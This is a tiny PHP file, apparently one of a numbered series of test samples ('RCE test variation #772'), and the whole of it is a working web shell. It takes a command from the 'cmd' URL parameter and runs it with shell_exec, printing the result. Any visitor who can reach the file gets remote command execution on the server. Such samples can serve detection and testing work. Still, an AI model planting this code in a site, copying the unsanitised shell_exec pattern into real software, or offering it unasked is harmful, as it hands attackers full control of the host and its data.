<?php
// RCE test variation #772
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>